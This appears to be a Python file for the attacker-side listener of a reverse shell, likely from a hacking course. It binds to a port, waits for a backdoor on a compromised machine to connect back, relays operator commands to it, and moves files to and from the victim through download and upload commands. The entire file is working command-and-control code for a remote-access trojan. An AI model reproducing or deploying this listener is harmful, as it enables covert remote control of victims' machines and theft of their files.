#!/usr/bin/env python
import socket,json ,base64


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        listener.bind((ip,port))

        listener.listen(0)
        print("[+] Waiting for connection")
        self.connection, address = listener.accept()  # accept() returns two things
        print("[+] Got a connection from " + str(address) + "\n")

    def reliable_send(self, data):
            json_data = json.dumps(data)
            self.connection.send(bytes(json_data, 'utf-8'))


    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                temp = self.connection.recv(1024)
                json_data = json_data + temp.decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                continue
    def write_file(self, path ,content):
        with open(path, "wb") as file:
            #print(content)

            # print(type(content))
            file.write(base64.b64decode(content))
            #print(base64.b64decode(content))
            return "[+] Download succcesful,"

    def read_file(self, path):
        with open(path, "rb") as file:
            return file.read()
            #return base64.b64encode(file.read())

    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ")   #split by spaces
            print(command)
            try:
                if command[0] == "upload":
                            file_content = self.read_file(command[1])
                            command.append(file_content)

                self.reliable_send(command)

                if command[0] =="exit":
                            self.connection.close()
                            exit()
                result = self.reliable_receive()
                if command[0] == "download" and "[-] Error " not in result:
                            result = self.write_file(command[1] ,result)
            except Exception:
                result = "[-] 1Error during command execution."
            print(result)


my_listener = Listener("192.168.0.1", 4444)             #change ip
my_listener.run()

